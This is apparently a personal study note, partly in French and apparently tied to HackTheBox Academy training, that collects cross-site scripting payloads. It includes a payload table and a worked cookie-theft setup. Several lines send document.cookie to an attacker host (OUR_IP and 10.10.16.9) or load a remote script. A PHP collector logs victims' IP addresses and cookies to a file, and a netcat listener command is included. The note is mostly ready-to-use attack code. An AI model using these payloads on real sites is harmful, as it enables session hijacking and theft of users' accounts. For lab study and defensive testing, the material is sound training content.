---
id: XSS
created_date: 18/04/2024
updated_date: 18/04/2024
type: note
---

#  XSS
- **🏷️Tags** :  #04-2024 #explotation #XSS #payloads #php #scripting 

## 📝 Notes

| Code                                                                                          | Description                       |     |
| --------------------------------------------------------------------------------------------- | --------------------------------- | --- |
| **XSS Payloads**                                                                              |                                   |     |
| `"><script>alert(window.origin)</script>`                                                     | Basic XSS Payload                 |     |
| `'><script>alert(window.origin)</script>`                                                     | Basic XSS Payload                 |     |
| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload                 |     |
| `<plaintext>`                                                                                 | Basic XSS Payload                 |     |
| `<script>print()</script>`                                                                    | Basic XSS Payload                 |     |
| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload            |     |
| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color           |     |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image           |     |
| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title              |     |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body     |     |
| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element       |     |
| `<script src="http://OUR_IP/script.js"></script>`                                             | Load remote script                |     |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie details to us         |     |
| **Commands**                                                                                  |                                   |     |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`                           | Run `xsstrike` on a url parameter |     |
| `sudo nc -lvnp 80`                                                                            | Start `netcat` listener           |     |
| `sudo php -S 0.0.0.0:80 `                                                                     | Start `PHP` server                |     |


### Utilisation d'un payload XSS avec un script PHP pour récuperer les cookies d'une session

Utilisation d'un **payload XSS** appelant un fichier **js** avec lui même une requête sur les cookies de la sessions et appel d'un fichier **php** pour récuperer au clair les informations dans un txt.

#### Payload avec connexion à notre propre serveur php
```bash
"><script src=http://10.10.16.9/script.js></script>
```

#### deuxième payload ( requête pour récupération des cookies )
```javascript

?>new Image().src='http://10.10.16.9/index.php?c='+document.cookie

```

#### PHP script
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
```

#### Utilisation des entrées directe :
- Code Javascript<script></script>
- Code de style CSS<style></style>
- Champs de balise/attribut<div name='INPUT'></div>
- Commentaires HTML<!-- --> 